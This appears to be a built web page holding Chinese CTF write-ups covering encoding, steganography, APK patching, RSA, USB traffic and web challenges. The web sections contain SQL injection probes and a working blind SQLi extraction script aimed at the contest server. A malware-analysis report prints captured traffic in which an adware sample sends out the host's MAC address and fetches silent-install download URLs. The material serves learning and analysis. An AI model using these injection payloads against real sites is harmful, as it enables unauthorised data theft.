import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as p,o as i}from"./app-CJlMl9Ja.js";const l={};function e(t,s){return i(),a("div",null,s[0]||(s[0]=[p(`<h1 id="xp0int大家庭" tabindex="-1"><a class="header-anchor" href="#xp0int大家庭"><span>Xp0int大家庭</span></a></h1><blockquote><p>Xp0int日常，跑一下我们在干什么？</p></blockquote><p>网上搜索发现是 aaencode 所以试试在chrome的console运行。 得到flag</p><h1 id="弗拉戈在哪里" tabindex="-1"><a class="header-anchor" href="#弗拉戈在哪里"><span>弗拉戈在哪里？</span></a></h1><blockquote><p>小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？</p></blockquote><p>提示： 在zip里面</p><p>1.zip 拖进UltraEdit 搜索flag<br> 发现一段base64，于是解码。应该也能用strings命令看到base64。</p><h1 id="好像说太多了" tabindex="-1"><a class="header-anchor" href="#好像说太多了"><span>好像说太多了</span></a></h1><p>提示：说太多<br> 根据 ctf wiki的说法 用 https://quipqiup.com/ 词频分析，得到flag</p><blockquote><p>clues vtsegdt=welcome zg=to egdhtzozogf=competition</p></blockquote><blockquote><p>welcome to our competition!today is a nice day,i hope that you can win the prize and share it with me.our team is best in my mind,but i am too weak.so i am working hard to study.the most important thing is that i will tell you a secert that the flag is wordfrequencyanalysis.the trouble is that this analysis needs more to analyze, so i am going to have a chat with you.but i do not know what to talk about with you, i am very hard, i hope you can forgive me.</p></blockquote><h1 id="sga" tabindex="-1"><a class="header-anchor" href="#sga"><span>SGA</span></a></h1><p>看了提示才答出来的。后来觉得以图搜图可能也行。 百度： 标准银河字母。。。 得到对应的表</p><h1 id="warmup" tabindex="-1"><a class="header-anchor" href="#warmup"><span>warmup</span></a></h1><p>提示： 据说：这是Xp0int公众号热身赛的题目，emmmm好像有什么不一样了。</p><p>根据提示，使用githack获取到xp0.jpg ， 然后用foremost得到zip<br> 然后使用AZPR 来进行文本攻击： 将xp.jpg 压缩，确认xp.jpg的crc32与加密的压缩包一致，然后开始即可。<br> 参考：http://www.360zhijia.com/360anquanke/217342.html</p><h1 id="combo" tabindex="-1"><a class="header-anchor" href="#combo"><span>combo</span></a></h1><p>用jd-gui反编译，查看得出来的java代码 ，再对应smali 把if 的判断删掉，编译出apk，点击按钮即得到倒序的flag</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-java"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> onClick</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">View</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> paramView)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    switch</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">paramView</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    default:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    case</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2131427423</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">currentClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> System</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">currentTimeMillis</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">currentClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">lastClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> &lt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 500L</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">      label58</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">showCombo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;当前连击次数：&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot; 次&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> !=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 201710</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        break</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> label129</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">showFlag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2131099682</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    while</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">lastClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">currentClkTime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      break</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">      break</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> label58</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">      label129</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> if</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">clkAcount</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> &lt;=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2017</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        continue</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">      this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">showFlag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;连击 201710 次就可以获得flag啦！&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">  }</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="弗拉戈在哪里2" tabindex="-1"><a class="header-anchor" href="#弗拉戈在哪里2"><span>弗拉戈在哪里2?</span></a></h1><p>用strings命令，直接得到flag</p><h1 id="easyrsa" tabindex="-1"><a class="header-anchor" href="#easyrsa"><span>EasyRSA</span></a></h1><p>参考文章 http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</p><p>因为没有研究过rsa,所以只能follow文章去做。 已知 n e c<br> 把 n 放到 http://factordb.com 上分解，分解成功，得到p q。 e = 0x10001。<br> 用工具计算n 遂得到 m = pow(c, d, n)</p><h1 id="《web安全入门第一课》-《web安全入门第二课》-一段矛盾的代码" tabindex="-1"><a class="header-anchor" href="#《web安全入门第一课》-《web安全入门第二课》-一段矛盾的代码"><span>《web安全入门第一课》 ，《web安全入门第二课》 ，一段矛盾的代码</span></a></h1><p>矛盾的代码，这个虽然不太懂，没接触过PHP，但有了源码就可以搜索相关的问题。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>is_numeric(1a)   FALSE</span></span>
<span class="line"><span>1a == 1          TRUE</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>http://119.29.191.200/ctf/46d3e59de07a6aac6b2078c35aa4c16a03d10df3/?num=1a</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="重重flag背后隐藏的秘密" tabindex="-1"><a class="header-anchor" href="#重重flag背后隐藏的秘密"><span>重重flag背后隐藏的秘密</span></a></h1><p>正则表达式筛选可以得到答案。</p><h1 id="一张含有信息的图片" tabindex="-1"><a class="header-anchor" href="#一张含有信息的图片"><span>一张含有信息的图片</span></a></h1><p>古时候打仗，友军间通信为了不被敌人发现重要的情报，用了各种各样的方法隐藏信息，延续到了现代，又有了新的变化...</p><p>binwalk发现zlib ， 解压发现exif ，没头绪，放进Photoshop ，调色，发现flag。看到flag内容又get到一个新工具。</p><h1 id="一个简陋的博客" tabindex="-1"><a class="header-anchor" href="#一个简陋的博客"><span>一个简陋的博客</span></a></h1><p>前端的X同学做一半跑路了，反正功能实现了，能上传文章就行（逃。。。</p><p>对前几天才接触CTF的喔来说，这道题一直没有头绪，直到看到了这篇文章 <a href="http://www.lujza.me/%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E4%B9%8Bweb%E4%B8%93%E9%A2%98-2.html" target="_blank" rel="noopener noreferrer">实验吧CTF之web专题-2</a> 原来是这样的</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>?id=&#39;               FALSE</span></span>
<span class="line"><span>?id=1 &#39;and &#39;1&#39;=&#39;1   TRUE</span></span>
<span class="line"><span>?id=1 &#39;and &#39;1&#39;=&#39;2   FALSE</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>现在可以猜密码了。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>(select count(*) from flag)&gt;0</span></span>
<span class="line"><span>(select flag from flag)&gt; 0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>于是得到flag ，但不知为何，提交说答案错误，后来发现全是小写。所以要注意了。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>flAG{3Q1Map_1S_u3Sfu1}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>代码记录</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>import requests</span></span>
<span class="line"><span></span></span>
<span class="line"><span>url = &quot;http://119.29.191.200/ctf/7601547c91c318b3f60df2a6f1f7b69a407affa2/index.php?id=11864&quot;</span></span>
<span class="line"><span>strs = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ@_.{}-&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>def check_flag_len():</span></span>
<span class="line"><span>    flag_len = 0</span></span>
<span class="line"><span>    for i in range(0, 500):</span></span>
<span class="line"><span>        sql = &quot;%27%20and%20(select%20length(flag)%20from%20flag)%3E&quot; + str(i) + &quot;%23)&quot;</span></span>
<span class="line"><span>        result = requests.get(url+sql)</span></span>
<span class="line"><span>        if not result.text.find(&quot;HELLO&quot;) &gt; 0:</span></span>
<span class="line"><span>            flag_len = i - 1</span></span>
<span class="line"><span>            break</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    return flag_len</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>def find_flag(flag_len):</span></span>
<span class="line"><span>    flag = &quot;&quot;</span></span>
<span class="line"><span>    while len(flag) &lt; flag_len:</span></span>
<span class="line"><span>        for i in strs:</span></span>
<span class="line"><span>            sql = &quot;%27%20and%20substring((select%20flag%20from%20flag%20)%20from%20&quot; + str(len(flag)+1) + &quot;%20for%201%20)=%27&quot; + i</span></span>
<span class="line"><span>            result = requests.get(url+sql)</span></span>
<span class="line"><span>            if result.text.find(&quot;HELLO&quot;) &gt; 0:</span></span>
<span class="line"><span>                flag = flag + i</span></span>
<span class="line"><span>                print(flag)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="一段奇怪的流量" tabindex="-1"><a class="header-anchor" href="#一段奇怪的流量"><span>一段奇怪的流量</span></a></h1><p>X同学最近抓了一个流量包，你能分析下包的内容吗？</p><p>用Wireshark打开，发现是USB流量包。没有思路，于是搜索发现一篇文章。<a href="http://bobao.360.cn/learning/detail/3351.html" target="_blank" rel="noopener noreferrer">【技术分享】从CTF中学USB流量捕获</a></p><p>这个USB流量包也许就是鼠标或键盘的流量，然后通过观察Wireshark流量，中间有一段非常规律，不连续的流量。十六进制符合键盘流量的特征。<br><img src="http://7xkmnm.com1.z0.glb.clouddn.com/截图1.PNG" alt="image"></p><p>参考文章的程序，提取出一段数据。貌似没有区分大小写，看文档，大小写都是同一个信号。</p><blockquote><p>Usage of keys is not modified by the state of the Control, Alt, Shift or Num Lock keys. That is, a key does not send extra codes to compensate for the state of any Control, Alt, Shift or Num Lock key.</p></blockquote><p>发现数据是十六进制，解码看起来是个压缩文件。解压得到flag。</p><h1 id="舍友的秘密" tabindex="-1"><a class="header-anchor" href="#舍友的秘密"><span>舍友的秘密</span></a></h1><p>有一天机智的X同学发现流量中有些异常，好像这个软件上传了舍友的信息，最重要的是上传了某个地址信息，你能找出这个地址信息吗</p><p>注1：提交形式：flag{xx-xx-xx-xx-xx-xx}(其中xx为16进制，且全部小写)</p><p>注2：该题需在writeup中提交详细报告</p><p>警告：这是真实恶意样本，含有信息收集行为，请在虚拟机打开</p><p>答案： 上传的是本机的MAC地址</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>Address: Vmware_3e:12:85 (00:0c:29:3e:12:85)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="报告" tabindex="-1"><a class="header-anchor" href="#报告"><span>报告：</span></a></h2><p>题目提示：</p><ol><li>flag{xx-xx-xx-xx-xx-xx}(其中xx为16进制，且全部小写)。</li><li>恶意样本，在虚拟机内执行</li></ol><p>题目文件：</p><ol><li>恶意样本</li><li>数据包</li></ol><p>打算用ProcessMonitor看它的行为。 运行后收集到了相关的行为。把收集到的行为保存格式是csv。恶意软件的主要进程是</p><blockquote><p>1.6.4@302_111085.exe</p></blockquote><p>用python简单过滤处理下</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>import csv</span></span>
<span class="line"><span></span></span>
<span class="line"><span>names = [&#39;1.6.4@302_111085.exe&#39;]</span></span>
<span class="line"><span>output = open(&#39;output.csv&#39;,&#39;wb&#39;)</span></span>
<span class="line"><span>write_csv = csv.writer(output)</span></span>
<span class="line"><span>read_csv= csv.reader(open(&#39;Logfile2.csv&#39;,&#39;r&#39;))</span></span>
<span class="line"><span>for row in read_csv:</span></span>
<span class="line"><span>    for i in names:</span></span>
<span class="line"><span>        if row[1] == i:</span></span>
<span class="line"><span>            write_csv.writerow(row)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>为了分析的方便，用excel对数据进行处理，重点是上传下载，将相应的行为标记上颜色。 <img src="http://7xkmnm.com1.z0.glb.clouddn.com/xls1.PNG" alt="image"></p><p>1.6.4@302_111085.exe<br> 打开后没有操作的情况下频繁地对系统文件进行读写操作，未经用户同意释放软件安装包，恶意软件无疑。</p><p>发现一个很可疑的ip <img src="http://7xkmnm.com1.z0.glb.clouddn.com/xls2.PNG" alt="image"></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>VM-PC:49160 -&gt; 121.43.97.175:http</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>于是打开wireshark输入 ip.addr == 121.43.97.175</p><p>选择该ip以追踪HTTP流，然后就得到了软件的第一次联网数据。</p><p>这段数据是不是看起来很正常呢？ 不是，很明显恶意软件在通过api获取推广软件的下载地址。 既然要做推广必然要标记用户，所以收集用户信息是非常常见的流氓行为。</p><blockquote><p>GET /api.php?id=111085&amp;qid=302&amp;rand=52231541381&amp;flag=328704&amp;title=1.6.4&amp;t=0 HTTP/1.1</p></blockquote><p>这里可以看到软件通过GET请求上传了用户信息，据我猜测，地址信息应该不是ip地址，那应该就是网卡的mac地址了。<br> 转换成十进制 就是rand这个参数没跑了。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>00:0c:29:3e:12:85 </span></span>
<span class="line"><span>52231541381</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这里附上相关的数据和文件</p><p><a href="http://7xkmnm.com1.z0.glb.clouddn.com/output.xls" target="_blank" rel="noopener noreferrer">1.6.4@302_111085.exe 行为</a></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>GET /api.php?id=111085&amp;qid=302&amp;rand=52231541381&amp;flag=328704&amp;title=1.6.4&amp;t=0 HTTP/1.1</span></span>
<span class="line"><span>User-Agent: NSIS_Inetc (Mozilla)</span></span>
<span class="line"><span>Host: down.xiald.com</span></span>
<span class="line"><span>Connection: Keep-Alive</span></span>
<span class="line"><span>Cache-Control: no-cache</span></span>
<span class="line"><span></span></span>
<span class="line"><span>HTTP/1.1 200 OK</span></span>
<span class="line"><span>Content-Type: text/html</span></span>
<span class="line"><span>Server: Microsoft-IIS/7.5</span></span>
<span class="line"><span>X-Powered-By: PHP/5.3.28</span></span>
<span class="line"><span>Date: Mon, 07 Aug 2017 03:17:26 GMT</span></span>
<span class="line"><span>Content-Length: 915</span></span>
<span class="line"><span></span></span>
<span class="line"><span>{&quot;error&quot;:0,&quot;data&quot;:{&quot;Name&quot;:&quot;我的世界1.6.4懒人包&quot;,&quot;Desc&quot;:&quot;我的世界1.6.4懒人包是玩家整合的一款minecraft大型mod整合包，包括玩家们都非常喜欢的工业、、农业、超级英雄、枪械等mod，市面上很少见噢，需要的朋友赶紧拉游戏操作方法移动：W、S、A、D物品：E跳跃：空格前行：左Shift攻击：鼠标左键使用：鼠标右键视角&quot;,&quot;URL&quot;:&quot;http:\\/\\/gm2.pc6.com\\/hs1\\/pc6mc164-mcsetup.exe&quot;,&quot;Ver&quot;:&quot;&quot;,&quot;Size&quot;:&quot;271360&quot;,&quot;Icon&quot;:&quot;http:\\/\\/7.pic.pc6.com\\/up\\/2014-4\\/2014430162429.jpg&quot;,&quot;File&quot;:&quot;pc6mc164-mcsetup.exe&quot;}}GET /cfg.php?id=111085&amp;qid=302&amp;rand=52231541381&amp;flag=328704&amp;title=1.6.4&amp;t=0 HTTP/1.1</span></span>
<span class="line"><span>User-Agent: NSIS_Inetc (Mozilla)</span></span>
<span class="line"><span>Host: down.xiald.com</span></span>
<span class="line"><span>Connection: Keep-Alive</span></span>
<span class="line"><span>Cache-Control: no-cache</span></span>
<span class="line"><span></span></span>
<span class="line"><span>HTTP/1.1 200 OK</span></span>
<span class="line"><span>Content-Type: text/html</span></span>
<span class="line"><span>Server: Microsoft-IIS/7.5</span></span>
<span class="line"><span>X-Powered-By: PHP/5.3.28</span></span>
<span class="line"><span>Date: Mon, 07 Aug 2017 03:17:26 GMT</span></span>
<span class="line"><span>Content-Length: 8357</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>[rec]</span></span>
<span class="line"><span>N_1=............</span></span>
<span class="line"><span>Z_1=230</span></span>
<span class="line"><span>O_1=1</span></span>
<span class="line"><span>D_1=..............</span></span>
<span class="line"><span>I_1=http://down.shg20.com/shichangbu/ico/zny.ico</span></span>
<span class="line"><span>U_1=http://down.znyshurufa.com/qdb/zny_znylxnb101.exe</span></span>
<span class="line"><span>F_1=zny_znylxnb101.exe</span></span>
<span class="line"><span>P_1=/S</span></span>
<span class="line"><span>C_1=2</span></span>
<span class="line"><span>R_1=2</span></span>
<span class="line"><span>S_1=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\............</span></span>
<span class="line"><span>V_1=UninstallString</span></span>
<span class="line"><span>Y_1=0</span></span>
<span class="line"><span>L_1=0</span></span>
<span class="line"><span>E_1=app230</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_2=....</span></span>
<span class="line"><span>Z_2=187</span></span>
<span class="line"><span>O_2=1</span></span>
<span class="line"><span>D_2=..............</span></span>
<span class="line"><span>I_2=http://xiazai.xiazai2.net/ico/kuaizip.ico</span></span>
<span class="line"><span>U_2=http://dl.kkdownload.com/kz5lixjm3/KuaiZip_Setup_3818139782_lixjm3_001.exe</span></span>
<span class="line"><span>F_2=KuaiZip_Setup_3818139782_lixjm3_001.exe</span></span>
<span class="line"><span>P_2=</span></span>
<span class="line"><span>C_2=1</span></span>
<span class="line"><span>R_2=2</span></span>
